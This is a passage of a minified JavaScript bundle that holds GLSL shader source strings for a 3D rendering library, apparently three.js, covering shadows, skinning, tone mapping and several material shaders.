];\n\t\tstruct PointLightShadow {\n\t\t\tfloat shadowBias;\n\t\t\tfloat shadowNormalBias;\n\t\t\tfloat shadowRadius;\n\t\t\tvec2 shadowMapSize;\n\t\t\tfloat shadowCameraNear;\n\t\t\tfloat shadowCameraFar;\n\t\t};\n\t\tuniform PointLightShadow pointLightShadows[ NUM_POINT_LIGHT_SHADOWS ];\n\t#endif\n#endif",shadowmap_vertex:"#ifdef USE_SHADOWMAP\n\t#if NUM_DIR_LIGHT_SHADOWS > 0 || NUM_SPOT_LIGHT_SHADOWS > 0 || NUM_POINT_LIGHT_SHADOWS > 0\n\t\tvec3 shadowWorldNormal = inverseTransformDirection( transformedNormal, viewMatrix );\n\t\tvec4 shadowWorldPosition;\n\t#endif\n\t#if NUM_DIR_LIGHT_SHADOWS > 0\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < NUM_DIR_LIGHT_SHADOWS; i ++ ) {\n\t\tshadowWorldPosition = worldPosition + vec4( shadowWorldNormal * directionalLightShadows[ i ].shadowNormalBias, 0 );\n\t\tvDirectionalShadowCoord[ i ] = directionalShadowMatrix[ i ] * shadowWorldPosition;\n\t}\n\t#pragma unroll_loop_end\n\t#endif\n\t#if NUM_SPOT_LIGHT_SHADOWS > 0\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < NUM_SPOT_LIGHT_SHADOWS; i ++ ) {\n\t\tshadowWorldPosition = worldPosition + vec4( shadowWorldNormal * spotLightShadows[ i ].shadowNormalBias, 0 );\n\t\tvSpotShadowCoord[ i ] = spotShadowMatrix[ i ] * shadowWorldPosition;\n\t}\n\t#pragma unroll_loop_end\n\t#endif\n\t#if NUM_POINT_LIGHT_SHADOWS > 0\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < NUM_POINT_LIGHT_SHADOWS; i ++ ) {\n\t\tshadowWorldPosition = worldPosition + vec4( shadowWorldNormal * pointLightShadows[ i ].shadowNormalBias, 0 );\n\t\tvPointShadowCoord[ i ] = pointShadowMatrix[ i ] * shadowWorldPosition;\n\t}\n\t#pragma unroll_loop_end\n\t#endif\n#endif",shadowmask_pars_fragment:"float getShadowMask() {\n\tfloat shadow = 1.0;\n\t#ifdef USE_SHADOWMAP\n\t#if NUM_DIR_LIGHT_SHADOWS > 0\n\tDirectionalLightShadow directionalLight;\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < NUM_DIR_LIGHT_SHADOWS; i ++ ) {\n\t\tdirectionalLight = directionalLightShadows[ i ];\n\t\tshadow *= receiveShadow ? getShadow( directionalShadowMap[ i ], directionalLight.shadowMapSize, directionalLight.shadowBias, directionalLight.shadowRadius, vDirectionalShadowCoord[ i ] ) : 1.0;\n\t}\n\t#pragma unroll_loop_end\n\t#endif\n\t#if NUM_SPOT_LIGHT_SHADOWS > 0\n\tSpotLightShadow spotLight;\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < NUM_SPOT_LIGHT_SHADOWS; i ++ ) {\n\t\tspotLight = spotLightShadows[ i ];\n\t\tshadow *= receiveShadow ? getShadow( spotShadowMap[ i ], spotLight.shadowMapSize, spotLight.shadowBias, spotLight.shadowRadius, vSpotShadowCoord[ i ] ) : 1.0;\n\t}\n\t#pragma unroll_loop_end\n\t#endif\n\t#if NUM_POINT_LIGHT_SHADOWS > 0\n\tPointLightShadow pointLight;\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < NUM_POINT_LIGHT_SHADOWS; i ++ ) {\n\t\tpointLight = pointLightShadows[ i ];\n\t\tshadow *= receiveShadow ? getPointShadow( pointShadowMap[ i ], pointLight.shadowMapSize, pointLight.shadowBias, pointLight.shadowRadius, vPointShadowCoord[ i ], pointLight.shadowCameraNear, pointLight.shadowCameraFar ) : 1.0;\n\t}\n\t#pragma unroll_loop_end\n\t#endif\n\t#endif\n\treturn shadow;\n}",skinbase_vertex:"#ifdef USE_SKINNING\n\tmat4 boneMatX = getBoneMatrix( skinIndex.x );\n\tmat4 boneMatY = getBoneMatrix( skinIndex.y );\n\tmat4 boneMatZ = getBoneMatrix( skinIndex.z );\n\tmat4 boneMatW = getBoneMatrix( skinIndex.w );\n#endif",skinning_pars_vertex:"#ifdef USE_SKINNING\n\tuniform mat4 bindMatrix;\n\tuniform mat4 bindMatrixInverse;\n\t#ifdef BONE_TEXTURE\n\t\tuniform highp sampler2D boneTexture;\n\t\tuniform int boneTextureSize;\n\t\tmat4 getBoneMatrix( const in float i ) {\n\t\t\tfloat j = i * 4.0;\n\t\t\tfloat x = mod( j, float( boneTextureSize ) );\n\t\t\tfloat y = floor( j / float( boneTextureSize ) );\n\t\t\tfloat dx = 1.0 / float( boneTextureSize );\n\t\t\tfloat dy = 1.0 / float( boneTextureSize );\n\t\t\ty = dy * ( y + 0.5 );\n\t\t\tvec4 v1 = texture2D( boneTexture, vec2( dx * ( x + 0.5 ), y ) );\n\t\t\tvec4 v2 = texture2D( boneTexture, vec2( dx * ( x + 1.5 ), y ) );\n\t\t\tvec4 v3 = texture2D( boneTexture, vec2( dx * ( x + 2.5 ), y ) );\n\t\t\tvec4 v4 = texture2D( boneTexture, vec2( dx * ( x + 3.5 ), y ) );\n\t\t\tmat4 bone = mat4( v1, v2, v3, v4 );\n\t\t\treturn bone;\n\t\t}\n\t#else\n\t\tuniform mat4 boneMatrices[ MAX_BONES ];\n\t\tmat4 getBoneMatrix( const in float i ) {\n\t\t\tmat4 bone = boneMatrices[ int(i) ];\n\t\t\treturn bone;\n\t\t}\n\t#endif\n#endif",skinning_vertex:"#ifdef USE_SKINNING\n\tvec4 skinVertex = bindMatrix * vec4( transformed, 1.0 );\n\tvec4 skinned = vec4( 0.0 );\n\tskinned += boneMatX * skinVertex * skinWeight.x;\n\tskinned += boneMatY * skinVertex * skinWeight.y;\n\tskinned += boneMatZ * skinVertex * skinWeight.z;\n\tskinned += boneMatW * skinVertex * skinWeight.w;\n\ttransformed = ( bindMatrixInverse * skinned ).xyz;\n#endif",skinnormal_vertex:"#ifdef USE_SKINNING\n\tmat4 skinMatrix = mat4( 0.0 );\n\tskinMatrix += skinWeight.x * boneMatX;\n\tskinMatrix += skinWeight.y * boneMatY;\n\tskinMatrix += skinWeight.z * boneMatZ;\n\tskinMatrix += skinWeight.w * boneMatW;\n\tskinMatrix = bindMatrixInverse * skinMatrix * bindMatrix;\n\tobjectNormal = vec4( skinMatrix * vec4( objectNormal, 0.0 ) ).xyz;\n\t#ifdef USE_TANGENT\n\t\tobjectTangent = vec4( skinMatrix * vec4( objectTangent, 0.0 ) ).xyz;\n\t#endif\n#endif",specularmap_fragment:"float specularStrength;\n#ifdef USE_SPECULARMAP\n\tvec4 texelSpecular = texture2D( specularMap, vUv );\n\tspecularStrength = texelSpecular.r;\n#else\n\tspecularStrength = 1.0;\n#endif",specularmap_pars_fragment:"#ifdef USE_SPECULARMAP\n\tuniform sampler2D specularMap;\n#endif",tonemapping_fragment:"#if defined( TONE_MAPPING )\n\tgl_FragColor.rgb = toneMapping( gl_FragColor.rgb );\n#endif",tonemapping_pars_fragment:"#ifndef saturate\n#define saturate(a) clamp( a, 0.0, 1.0 )\n#endif\nuniform float toneMappingExposure;\nvec3 LinearToneMapping( vec3 color ) {\n\treturn toneMappingExposure * color;\n}\nvec3 ReinhardToneMapping( vec3 color ) {\n\tcolor *= toneMappingExposure;\n\treturn saturate( color / ( vec3( 1.0 ) + color ) );\n}\nvec3 OptimizedCineonToneMapping( vec3 color ) {\n\tcolor *= toneMappingExposure;\n\tcolor = max( vec3( 0.0 ), color - 0.004 );\n\treturn pow( ( color * ( 6.2 * color + 0.5 ) ) / ( color * ( 6.2 * color + 1.7 ) + 0.06 ), vec3( 2.2 ) );\n}\nvec3 RRTAndODTFit( vec3 v ) {\n\tvec3 a = v * ( v + 0.0245786 ) - 0.000090537;\n\tvec3 b = v * ( 0.983729 * v + 0.4329510 ) + 0.238081;\n\treturn a / b;\n}\nvec3 ACESFilmicToneMapping( vec3 color ) {\n\tconst mat3 ACESInputMat = mat3(\n\t\tvec3( 0.59719, 0.07600, 0.02840 ),\t\tvec3( 0.35458, 0.90834, 0.13383 ),\n\t\tvec3( 0.04823, 0.01566, 0.83777 )\n\t);\n\tconst mat3 ACESOutputMat = mat3(\n\t\tvec3(\t1.60475, -0.10208, -0.00327 ),\t\tvec3( -0.53108,\t1.10813, -0.07276 ),\n\t\tvec3( -0.07367, -0.00605,\t1.07602 )\n\t);\n\tcolor *= toneMappingExposure / 0.6;\n\tcolor = ACESInputMat * color;\n\tcolor = RRTAndODTFit( color );\n\tcolor = ACESOutputMat * color;\n\treturn saturate( color );\n}\nvec3 CustomToneMapping( vec3 color ) { return color; }",transmissionmap_fragment:"#ifdef USE_TRANSMISSIONMAP\n\ttotalTransmission *= texture2D( transmissionMap, vUv ).r;\n#endif",transmissionmap_pars_fragment:"#ifdef USE_TRANSMISSIONMAP\n\tuniform sampler2D transmissionMap;\n#endif",uv_pars_fragment:"#if ( defined( USE_UV ) && ! defined( UVS_VERTEX_ONLY ) )\n\tvarying vec2 vUv;\n#endif",uv_pars_vertex:"#ifdef USE_UV\n\t#ifdef UVS_VERTEX_ONLY\n\t\tvec2 vUv;\n\t#else\n\t\tvarying vec2 vUv;\n\t#endif\n\tuniform mat3 uvTransform;\n#endif",uv_vertex:"#ifdef USE_UV\n\tvUv = ( uvTransform * vec3( uv, 1 ) ).xy;\n#endif",uv2_pars_fragment:"#if defined( USE_LIGHTMAP ) || defined( USE_AOMAP )\n\tvarying vec2 vUv2;\n#endif",uv2_pars_vertex:"#if defined( USE_LIGHTMAP ) || defined( USE_AOMAP )\n\tattribute vec2 uv2;\n\tvarying vec2 vUv2;\n\tuniform mat3 uv2Transform;\n#endif",uv2_vertex:"#if defined( USE_LIGHTMAP ) || defined( USE_AOMAP )\n\tvUv2 = ( uv2Transform * vec3( uv2, 1 ) ).xy;\n#endif",worldpos_vertex:"#if defined( USE_ENVMAP ) || defined( DISTANCE ) || defined ( USE_SHADOWMAP )\n\tvec4 worldPosition = vec4( transformed, 1.0 );\n\t#ifdef USE_INSTANCING\n\t\tworldPosition = instanceMatrix * worldPosition;\n\t#endif\n\tworldPosition = modelMatrix * worldPosition;\n#endif",background_frag:"uniform sampler2D t2D;\nvarying vec2 vUv;\nvoid main() {\n\tvec4 texColor = texture2D( t2D, vUv );\n\tgl_FragColor = mapTexelToLinear( texColor );\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n}",background_vert:"varying vec2 vUv;\nuniform mat3 uvTransform;\nvoid main() {\n\tvUv = ( uvTransform * vec3( uv, 1 ) ).xy;\n\tgl_Position = vec4( position.xy, 1.0, 1.0 );\n}",cube_frag:"#include <envmap_common_pars_fragment>\nuniform float opacity;\nvarying vec3 vWorldDirection;\n#include <cube_uv_reflection_fragment>\nvoid main() {\n\tvec3 vReflect = vWorldDirection;\n\t#include <envmap_fragment>\n\tgl_FragColor = envColor;\n\tgl_FragColor.a *= opacity;\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n}",cube_vert:"varying vec3 vWorldDirection;\n#include <common>\nvoid main() {\n\tvWorldDirection = transformDirection( position, modelMatrix );\n\t#include <begin_vertex>\n\t#include <project_vertex>\n\tgl_Position.z = gl_Position.w;\n}",depth_frag:"#if DEPTH_PACKING == 3200\n\tuniform float opacity;\n#endif\n#include <common>\n#include <packing>\n#include <uv_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvarying vec2 vHighPrecisionZW;\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tvec4 diffuseColor = vec4( 1.0 );\n\t#if DEPTH_PACKING == 3200\n\t\tdiffuseColor.a = opacity;\n\t#endif\n\t#include <map_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\t#include <logdepthbuf_fragment>\n\tfloat fragCoordZ = 0.5 * vHighPrecisionZW[0] / vHighPrecisionZW[1] + 0.5;\n\t#if DEPTH_PACKING == 3200\n\t\tgl_FragColor = vec4( vec3( 1.0 - fragCoordZ ), opacity );\n\t#elif DEPTH_PACKING == 3201\n\t\tgl_FragColor = packDepthToRGBA( fragCoordZ );\n\t#endif\n}",depth_vert:"#include <common>\n#include <uv_pars_vertex>\n#include <displacementmap_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvarying vec2 vHighPrecisionZW;\nvoid main() {\n\t#include <uv_vertex>\n\t#include <skinbase_vertex>\n\t#ifdef USE_DISPLACEMENTMAP\n\t\t#include <beginnormal_vertex>\n\t\t#include <morphnormal_vertex>\n\t\t#include <skinnormal_vertex>\n\t#endif\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <displacementmap_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\tvHighPrecisionZW = gl_Position.zw;\n}",distanceRGBA_frag:"#define DISTANCE\nuniform vec3 referencePosition;\nuniform float nearDistance;\nuniform float farDistance;\nvarying vec3 vWorldPosition;\n#include <common>\n#include <packing>\n#include <uv_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main () {\n\t#include <clipping_planes_fragment>\n\tvec4 diffuseColor = vec4( 1.0 );\n\t#include <map_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\tfloat dist = length( vWorldPosition - referencePosition );\n\tdist = ( dist - nearDistance ) / ( farDistance - nearDistance );\n\tdist = saturate( dist );\n\tgl_FragColor = packDepthToRGBA( dist );\n}",distanceRGBA_vert:"#define DISTANCE\nvarying vec3 vWorldPosition;\n#include <common>\n#include <uv_pars_vertex>\n#include <displacementmap_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\t#include <skinbase_vertex>\n\t#ifdef USE_DISPLACEMENTMAP\n\t\t#include <beginnormal_vertex>\n\t\t#include <morphnormal_vertex>\n\t\t#include <skinnormal_vertex>\n\t#endif\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <displacementmap_vertex>\n\t#include <project_vertex>\n\t#include <worldpos_vertex>\n\t#include <clipping_planes_vertex>\n\tvWorldPosition = worldPosition.xyz;\n}",equirect_frag:"uniform sampler2D tEquirect;\nvarying vec3 vWorldDirection;\n#include <common>\nvoid main() {\n\tvec3 direction = normalize( vWorldDirection );\n\tvec2 sampleUV = equirectUv( direction );\n\tvec4 texColor = texture2D( tEquirect, sampleUV );\n\tgl_FragColor = mapTexelToLinear( texColor );\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n}",equirect_vert:"varying vec3 vWorldDirection;\n#include <common>\nvoid main() {\n\tvWorldDirection = transformDirection( position, modelMatrix );\n\t#include <begin_vertex>\n\t#include <project_vertex>\n}",linedashed_frag:"uniform vec3 diffuse;\nuniform float opacity;\nuniform float dashSize;\nuniform float totalSize;\nvarying float vLineDistance;\n#include <common>\n#include <color_pars_fragment>\n#include <fog_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tif ( mod( vLineDistance, totalSize ) > dashSize ) {\n\t\tdiscard;\n\t}\n\tvec3 outgoingLight = vec3( 0.0 );\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\t#include <logdepthbuf_fragment>\n\t#include <color_fragment>\n\toutgoingLight = diffuseColor.rgb;\n\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n\t#include <premultiplied_alpha_fragment>\n}",linedashed_vert:"uniform float scale;\nattribute float lineDistance;\nvarying float vLineDistance;\n#include <common>\n#include <color_pars_vertex>\n#include <fog_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\tvLineDistance = scale * lineDistance;\n\t#include <color_vertex>\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\t#include <fog_vertex>\n}",meshbasic_frag:"uniform vec3 diffuse;\nuniform float opacity;\n#ifndef FLAT_SHADED\n\tvarying vec3 vNormal;\n#endif\n#include <common>\n#include <dithering_pars_fragment>\n#include <color_pars_fragment>\n#include <uv_pars_fragment>\n#include <uv2_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <aomap_pars_fragment>\n#include <lightmap_pars_fragment>\n#include <envmap_common_pars_fragment>\n#include <envmap_pars_fragment>\n#include <cube_uv_reflection_fragment>\n#include <fog_pars_fragment>\n#include <specularmap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\t#include <logdepthbuf_fragment>\n\t#include <map_fragment>\n\t#include <color_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\t#include <specularmap_fragment>\n\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\n\t#ifdef USE_LIGHTMAP\n\t\n\t\tvec4 lightMapTexel= texture2D( lightMap, vUv2 );\n\t\treflectedLight.indirectDiffuse += lightMapTexelToLinear( lightMapTexel ).rgb * lightMapIntensity;\n\t#else\n\t\treflectedLight.indirectDiffuse += vec3( 1.0 );\n\t#endif\n\t#include <aomap_fragment>\n\treflectedLight.indirectDiffuse *= diffuseColor.rgb;\n\tvec3 outgoingLight = reflectedLight.indirectDiffuse;\n\t#include <envmap_fragment>\n\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n\t#include <premultiplied_alpha_fragment>\n\t#include <dithering_fragment>\n}",meshbasic_vert:"#include <common>\n#include <uv_pars_vertex>\n#include <uv2_pars_vertex>\n#include <envmap_pars_vertex>\n#include <color_pars_vertex>\n#include <fog_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\t#include <uv2_vertex>\n\t#include <color_vertex>\n\t#include <skinbase_vertex>\n\t#ifdef USE_ENVMAP\n\t#include <beginnormal_vertex>\n\t#include <morphnormal_vertex>\n\t#include <skinnormal_vertex>\n\t#include <defaultnormal_vertex>\n\t#endif\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <worldpos_vertex>\n\t#include <clipping_planes_vertex>\n\t#include <envmap_vertex>\n\t#include <fog_vertex>\n}",meshlambert_frag:"uniform vec3 diffuse;\nuniform vec3 emissive;\nuniform float opacity;\nvarying vec3 vLightFront;\nvarying vec3 vIndirectFront;\n#ifdef DOUBLE_SIDED\n\tvarying vec3 vLightBack;\n\tvarying vec3 vIndirectBack;\n#endif\n#include <common>\n#include <packing>\n#include <dithering_pars_fragment>\n#include <color_pars_fragment>\n#include <uv_pars_fragment>\n#include <uv2_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <aomap_pars_fragment>\n#include <lightmap_pars_fragment>\n#include <emissivemap_pars_fragment>\n#include <envmap_common_pars_fragment>\n#include <envmap_pars_fragment>\n#include <cube_uv_reflection_fragment>\n#include <bsdfs>\n#include <lights_pars_begin>\n#include <fog_pars_fragment>\n#include <shadowmap_pars_fragment>\n#include <shadowmask_pars_fragment>\n#include <specularmap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\n\tvec3 totalEmissiveRadiance = emissive;\n\t#include <logdepthbuf_fragment>\n\t#include <map_fragment>\n\t#include <color_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\t#include <specularmap_fragment>\n\t#include <emissivemap_fragment>\n\t#ifdef DOUBLE_SIDED\n\t\treflectedLight.indirectDiffuse += ( gl_FrontFacing ) ? vIndirectFront : vIndirectBack;\n\t#else\n\t\treflectedLight.indirectDiffuse += vIndirectFront;\n\t#endif\n\t#include <lightmap_fragment>\n\treflectedLight.indirectDiffuse *= BRDF_Diffuse_Lambert( diffuseColor.rgb );\n\t#ifdef DOUBLE_SIDED\n\t\treflectedLight.directDiffuse = ( gl_FrontFacing ) ? vLightFront : vLightBack;\n\t#else\n\t\treflectedLight.directDiffuse = vLightFront;\n\t#endif\n\treflectedLight.directDiffuse *= BRDF_Diffuse_Lambert( diffuseColor.rgb ) * getShadowMask();\n\t#include <aomap_fragment>\n\tvec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + totalEmissiveRadiance;\n\t#include <envmap_fragment>\n\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n\t#include <premultiplied_alpha_fragment>\n\t#include <dithering_fragment>\n}",meshlambert_vert:"#define LAMBERT\nvarying vec3 vLightFront;\nvarying vec3 vIndirectFront;\n#ifdef DOUBLE_SIDED\n\tvarying vec3 vLightBack;\n\tvarying vec3 vIndirectBack;\n#endif\n#include <common>\n#include <uv_pars_vertex>\n#include <uv2_pars_vertex>\n#include <envmap_pars_vertex>\n#include <bsdfs>\n#include <lights_pars_begin>\n#include <color_pars_vertex>\n#include <fog_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <shadowmap_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\t#include <uv2_vertex>\n\t#include <color_vertex>\n\t#include <beginnormal_vertex>\n\t#include <morphnormal_vertex>\n\t#include <skinbase_vertex>\n\t#include <skinnormal_vertex>\n\t#include <defaultnormal_vertex>\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\t#include <worldpos_vertex>\n\t#include <envmap_vertex>\n\t#include <lights_lambert_vertex>\n\t#include <shadowmap_vertex>\n\t#include <fog_vertex>\n}",meshmatcap_frag:"#define MATCAP\nuniform vec3 diffuse;\nuniform float opacity;\nuniform sampler2D matcap;\nvarying vec3 vViewPosition;\n#ifndef FLAT_SHADED\n\tvarying vec3 vNormal;\n#endif\n#include <common>\n#include <dithering_pars_fragment>\n#include <color_pars_fragment>\n#include <uv_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <fog_pars_fragment>\n#include <bumpmap_pars_fragment>\n#include <normalmap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\t#include <logdepthbuf_fragment>\n\t#include <map_fragment>\n\t#include <color_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\t#include <normal_fragment_begin>\n\t#include <normal_fragment_maps>\n\tvec3 viewDir = normalize( vViewPosition );\n\tvec3 x = normalize( vec3( viewDir.z, 0.0, - viewDir.x ) );\n\tvec3 y = cross( viewDir, x );\n\tvec2 uv = vec2( dot( x, normal ), dot( y, normal ) ) * 0.495 + 0.5;\n\t#ifdef USE_MATCAP\n\t\tvec4 matcapColor = texture2D( matcap, uv );\n\t\tmatcapColor = matcapTexelToLinear( matcapColor );\n\t#else\n\t\tvec4 matcapColor = vec4( 1.0 );\n\t#endif\n\tvec3 outgoingLight = diffuseColor.rgb * matcapColor.rgb;\n\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n\t#include <premultiplied_alpha_fragment>\n\t#include <dithering_fragment>\n}",meshmatcap_vert:"#define MATCAP\nvarying vec3 vViewPosition;\n#ifndef FLAT_SHADED\n\tvarying vec3 vNormal;\n#endif\n#include <common>\n#include <uv_pars_vertex>\n#include <color_pars_vertex>\n#include <displacementmap_pars_vertex>\n#include <fog_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\t#include <color_vertex>\n\t#include <beginnormal_vertex>\n\t#include <morphnormal_vertex>\n\t#include <skinbase_vertex>\n\t#include <skinnormal_vertex>\n\t#include <defaultnormal_vertex>\n\t#ifndef FLAT_SHADED\n\t\tvNormal = normalize( transformedNormal );\n\t#endif\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <displacementmap_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\t#include <fog_vertex>\n\tvViewPosition = - mvPosition.xyz;\n}",meshtoon_frag:"#define TOON\nuniform vec3 diffuse;\nuniform vec3 emissive;\nuniform float opacity;\n#include <common>\n#include <packing>\n#include <dithering_pars_fragment>\n#include <color_pars_fragment>\n#include <uv_pars_fragment>\n#include <uv2_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <aomap_pars_fragment>\n#include <lightmap_pars_fragment>\n#include <emissivemap_pars_fragment>\n#include <gradientmap_pars_fragment>\n#include <fog_pars_fragment>\n#include <bsdfs>\n#include <lights_pars_begin>\n#include <lights_toon_pars_fragment>\n#include <shadowmap_pars_fragment>\n#include <bumpmap_pars_fragment>\n#include <normalmap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tvec4 diffuseColor = vec4( diffuse, opacity );\n\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\n\tvec3 totalEmissiveRadiance = emissive;\n\t#include <logdepthbuf_fragment>\n\t#include <map_fragment>\n\t#include <color_fragment>\n\t#include <alphamap_fragment>\n\t#include <alphatest_fragment>\n\t#include <normal_fragment_begin>\n\t#include <normal_fragment_maps>\n\t#include <emissivemap_fragment>\n\t#include <lights_toon_fragment>\n\t#include <lights_fragment_begin>\n\t#include <lights_fragment_maps>\n\t#include <lights_fragment_end>\n\t#include <aomap_fragment>\n\tvec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + totalEmissiveRadiance;\n\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\n\t#include <tonemapping_fragment>\n\t#include <encodings_fragment>\n\t#include <fog_fragment>\n\t#include <premultiplied_alpha_fragment>\n\t#include <dithering_fragment>\n}",meshtoon_vert:"#define TOON\nvarying vec3 vViewPosition;\n#ifndef FLAT_SHADED\n\tvarying vec3 vNormal;\n#endif\n#include <common>\n#include <uv_pars_vertex>\n#include <uv2_pars_vertex>\n#include <displacementmap_pars_vertex>\n#include <color_pars_vertex>\n#include <fog_pars_vertex>\n#include <morphtarget_pars_vertex>\n#include <skinning_pars_vertex>\n#include <shadowmap_pars_vertex>\n#include <logdepthbuf_pars_vertex>\n#include <clipping_planes_pars_vertex>\nvoid main() {\n\t#include <uv_vertex>\n\t#include <uv2_vertex>\n\t#include <color_vertex>\n\t#include <beginnormal_vertex>\n\t#include <morphnormal_vertex>\n\t#include <skinbase_vertex>\n\t#include <skinnormal_vertex>\n\t#include <defaultnormal_vertex>\n#ifndef FLAT_SHADED\n\tvNormal = normalize( transformedNormal );\n#endif\n\t#include <begin_vertex>\n\t#include <morphtarget_vertex>\n\t#include <skinning_vertex>\n\t#include <displacementmap_vertex>\n\t#include <project_vertex>\n\t#include <logdepthbuf_vertex>\n\t#include <clipping_planes_vertex>\n\tvViewPosition = - mvPosition.xyz;\n\t#include <worldpos_vertex>\n\t#include <shadowmap_vertex>\n\t#include <fog_vertex>\n}",meshphong_frag:"#define PHONG\nuniform vec3 diffuse;\nuniform vec3 emissive;\nuniform vec3 specular;\nuniform float shininess;\nuniform float opacity;\n#include <common>\n#include <packing>\n#include <dithering_pars_fragment>\n#include <color_pars_fragment>\n#include <uv_pars_fragment>\n#include <uv2_pars_fragment>\n#include <map_pars_fragment>\n#include <alphamap_pars_fragment>\n#include <aomap_pars_fragment>\n#include <lightmap_pars_fragment>\n#include <emissivemap_pars_fragment>\n#include <envmap_common_pars_fragment>\n#include <envmap_pars_fragment>\n#include <cube_uv_reflection_fragment>\n#include <fog_pars_fragment>\n#include <bsdfs>\n#include <lights_pars_begin>\n#include <lights_phong_pars_fragment>\n#include <shadowmap_pars_fragment>\n#include <bumpmap_pars_fragment>\n#include <normalmap_pars_fragment>\n#include <specularmap_pars_fragment>\n#include <logdepthbuf_pars_fragment>\n#include <clipping_planes_pars_fragment>\nvoid main() {\n\t#include <clipping_planes_fragment>\n\tvec4 diffuseColor = vec4( diffuse, opacity 